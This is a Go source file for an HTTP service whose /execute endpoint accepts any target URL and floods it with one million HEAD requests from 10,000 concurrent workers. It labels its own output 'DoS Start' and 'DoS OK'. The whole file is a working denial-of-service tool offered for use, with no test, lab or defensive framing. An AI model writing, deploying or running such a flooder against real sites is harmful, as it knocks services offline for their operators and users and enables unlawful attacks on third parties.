package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

type Request struct {
	URL string `json:"url"`
}

type Response struct {
	Message string `json:"message"`
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
	var req Request
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	targetURL := req.URL
	numWorkers := 10000
	numRequests := 1000000

	var counter int64
	var wg sync.WaitGroup

	fmt.Println("DoS Start")
	start := time.Now()

	client := &http.Client{
		Timeout: 2 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives:   true,
			MaxIdleConnsPerHost: 1000,
		},
	}

	jobs := make(chan int, numRequests)

	// ワーカー起動
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for range jobs {
				req, _ := http.NewRequest("HEAD", targetURL, nil)
				req.Close = true

				resp, err := client.Do(req)
				if err == nil {
					_, _ = io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}

				n := atomic.AddInt64(&counter, 1)
				if n%100 == 0 {
					fmt.Printf("[#%d]:DoS OK\n", n)
				}
			}
		}()
	}

	// ジョブ投入
	for i := 0; i < numRequests; i++ {
		jobs <- i
	}
	close(jobs)

	wg.Wait()
	elapsed := time.Since(start)

	msg := fmt.Sprintf("[+] Completed %d requests in %.2f seconds (approx %.2f RPS)\n",
		numRequests, elapsed.Seconds(), float64(numRequests)/elapsed.Seconds())

	// 結果をレスポンスとして返す
	json.NewEncoder(w).Encode(Response{Message: msg})
}

func main() {
	http.HandleFunc("/execute", executeHandler)
	log.Println("Listening on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
